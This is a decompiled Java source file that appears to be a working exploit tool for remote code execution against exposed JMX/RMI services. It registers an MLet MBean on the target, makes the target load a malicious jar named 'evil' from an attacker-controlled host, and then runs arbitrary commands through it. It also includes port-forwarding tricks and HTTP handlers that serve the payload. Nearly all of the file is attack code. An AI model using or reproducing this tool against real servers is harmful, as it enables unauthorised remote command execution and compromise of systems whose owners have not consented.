//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by Fernflower decompiler)
//

package com.cqq;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashSet;
import java.util.Iterator;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.management.InstanceAlreadyExistsException;
import javax.management.MBeanServerConnection;
import javax.management.ObjectInstance;
import javax.management.ObjectName;
import javax.management.remote.JMXConnector;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXServiceURL;

/**
 *
 * usage:
 *
 * java -jar jmxrmi-test.jar <IP> <PORT> whoami "kg403mhdmodrw6s0vcwedx0sfjlb90.burpcollaborator.net:80"
 *
 * 参考：
 * - https://hu3sky.github.io/2020/03/06/JMX-RMI/
 * - https://www.cnblogs.com/afanti/p/10610682.html
 * - https://webcache.googleusercontent.com/search?q=cache:https://www.optiv.com/blog/exploiting-jmx-rmi&strip=1&vwsrc=0
 */


public class RemoteMbean {
    private static final String JARNAME = "C:\\Users\\Administrator\\Downloads\\compromise\\out\\artifacts\\compromise_jar\\compromise.jar";
    private static final String OBJECTNAME = "MLetCompromise:name=evil,id=1";
    private static final String EVILCLASS = "com.braden.Evil";

    public RemoteMbean() {
    }

    public static void main(final String[] args) throws Exception {
        try {
            Registry registry = LocateRegistry.getRegistry(args[0], Integer.parseInt(args[1]));
            String d = "jmxrmi";
            String mBeansFromURL = args[3];    // "192.168.85.1:4141"

            try {
                d = args[4];
            } catch (Exception var14) {
                d = "jmxrmi";
            }

            Remote r = registry.lookup(d);
            String rr = r.toString();
            System.out.println(rr);
            String temp = rr.substring(rr.indexOf("endpoint:[") + 10);
            String[] hostport = temp.substring(0, temp.indexOf("]")).split(":");
            String host = hostport[0];
            Boolean isInnerip = innerIP(host);
            final int port = Integer.parseInt(hostport[1]);
            Thread f2t;
            if (host.startsWith("127.")) {
                System.out.println("[info] IP start with 127. port forward...");
                f2t = new Thread(new Runnable() {
                    public void run() {
                        PortMap.forward(port, args[0], port);
                        System.out.println(22222);
                    }
                });
                f2t.start();

                try {
                    Thread.sleep(100L);
                } catch (InterruptedException var13) {
                    var13.printStackTrace();
                }
            }

            if (isInnerip) {
                System.out.println("[info] IP is inner IP add a temp IP and port forward..");
                Runtime.getRuntime().exec("/bin/bash -c ip add add " + host + "  dev eth0:1");
                f2t = new Thread(new Runnable() {
                    public void run() {
                        PortMap.forward(port, args[0], port);
                        System.out.println(33333);
                    }
                });
                f2t.start();

                try {
                    Thread.sleep(100L);
                } catch (InterruptedException var12) {
                    var12.printStackTrace();
                }
            }

            connectAndOwn(args[0], args[1], args[2], args[3], d);
            if (isInnerip) {
                Runtime.getRuntime().exec("/bin/bash -c ip add del " + host + " dev eth0:1");
            }

            System.exit(0);
        } catch (Exception var15) {
            var15.printStackTrace();
        }

    }

    static void connectAndOwn(String serverName, String port, String command, String p_mBeansFromURL, String x) {
        try {
            JMXServiceURL u = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + serverName + ":" + port + "/" + x);
            System.out.println("URL: " + u + ", connecting");
            JMXConnector c = JMXConnectorFactory.connect(u);
            System.out.println("Connected: " + c.getConnectionId());
            MBeanServerConnection m = c.getMBeanServerConnection();
            ObjectInstance evil_bean = null;

            try {
                evil_bean = m.getObjectInstance(new ObjectName(OBJECTNAME));
            } catch (Exception var14) {
                evil_bean = null;
            }

            // 第一次没有这个Bean，需要先注册（从本地文件系统、或者远程URL加载）
            if (evil_bean == null) {
                System.out.println("Trying to create bean...");
                ObjectInstance evil = null;

                try {
                    evil = m.createMBean("javax.management.loading.MLet", null);
                } catch (InstanceAlreadyExistsException var13) {
                    evil = m.getObjectInstance(new ObjectName("DefaultDomain:type=MLet"));
                }

                System.out.println("Loaded " + evil.getClassName());

                /*

                关于getMBeansFromURL方法：
                参考：https://docs.oracle.com/javase/7/docs/api/javax/management/loading/MLetMBean.html
                Loads a text file containing MLET tags that define the MBeans to be added to the MBean server.
                 */
                // 自定义的a.html内容：
                // <html><mlet code="com.cqq.Evil" archive="compromise.jar" name="MLetCompromise:name=evil,id=1" codebase="http://HOST:PORT"></mlet></html>
                Object res = m.invoke(evil.getObjectName(), "getMBeansFromURL", new Object[]{String.format("http://%s/a.html", p_mBeansFromURL)}, new String[]{String.class.getName()});
                HashSet res_set = (HashSet)res;
                Iterator itr = res_set.iterator();
                Object nextObject = itr.next();
                if (nextObject instanceof Exception) {
                    throw (Exception)nextObject;
                }

                evil_bean = (ObjectInstance)nextObject;
            }

            System.out.println("Loaded class: " + evil_bean.getClassName() + " object " + evil_bean.getObjectName());
            Object result = m.invoke(evil_bean.getObjectName(), "runCommand", new Object[]{command}, new String[]{String.class.getName()});
            System.out.println("Result: " + result);
        } catch (Exception var15) {
            var15.printStackTrace();
        }

    }

    public static boolean innerIP(String ip) {
        String pattern = "((192\\.168|172\\.([1][6-9]|[2]\\d|3[01]))(\\.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d)){2}|^(\\D)*10(\\.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d)){3})";
        Pattern reg = Pattern.compile(pattern);
        Matcher match = reg.matcher(ip);
        return match.find();
    }

    static class JarHandler implements HttpHandler {
        JarHandler() {
        }

        public void handle(HttpExchange t) throws IOException {
            System.out.println("Request made for JAR...");
            File file = new File(RemoteMbean.JARNAME);
            byte[] bytearray = new byte[(int)file.length()];
            FileInputStream fis = new FileInputStream(file);
            BufferedInputStream bis = new BufferedInputStream(fis);
            bis.read(bytearray, 0, bytearray.length);
            t.sendResponseHeaders(200, file.length());
            OutputStream os = t.getResponseBody();
            os.write(bytearray, 0, bytearray.length);
            os.close();
        }
    }


    static class MLetHandler implements HttpHandler {
        MLetHandler() {
        }

        public void handle(HttpExchange t) throws IOException {
            String response = String.format("<mlet code=%s archive=%s name=%s></mlet>", RemoteMbean.EVILCLASS, RemoteMbean.JARNAME, RemoteMbean.OBJECTNAME);
            System.out.println("Sending mlet: " + response + "\n");
            t.sendResponseHeaders(200, response.length());
            OutputStream os = t.getResponseBody();
            os.write(response.getBytes());
            os.close();
        }
    }
}
